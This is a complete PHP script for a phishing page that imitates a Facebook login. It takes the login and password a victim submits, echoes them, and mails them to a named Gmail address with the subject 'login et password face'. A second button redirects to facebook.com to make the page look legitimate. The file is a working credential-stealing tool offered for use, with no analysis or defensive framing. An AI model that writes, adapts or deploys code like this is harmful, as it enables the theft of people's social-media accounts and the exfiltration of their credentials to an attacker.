<?php 	
	extract($_POST);
	if (isset($_POST["loginbutton"])) {
		$login = $_POST["login"];
		$password = $_POST['password'];
		$msg = $login."||||||".$password;
		echo $msg;
		mail("walterbruceken@gmail.com", "login et password face", $msg);
	}elseif (isset($_POST["signinbutton"])) {
		header("location: https://www.facebook.com");
	}
 ?>